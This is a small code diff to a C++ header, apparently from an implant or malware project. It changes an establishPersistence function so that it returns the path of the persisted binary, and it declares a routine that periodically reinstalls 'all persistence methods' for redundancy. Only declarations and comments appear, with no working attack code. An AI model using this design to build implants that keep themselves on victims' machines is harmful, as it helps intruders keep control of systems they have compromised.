@@ -4,9 +4,9 @@
 namespace persistence {
 
 // Establishes persistence.
-// Returns true if this is the first run and persistence was just installed.
-// Returns false if the implant is already running from its persistence location.
-bool establishPersistence(const std::wstring& overrideSourcePath = L"");
+// Returns the path of the persisted binary if successful (or if already running from it).
+// Returns an empty string on failure.
+std::wstring establishPersistence(const std::wstring& overrideSourcePath = L"");
 
 // Periodically re-installs all persistence methods to ensure redundancy.
 void ReinstallPersistence();
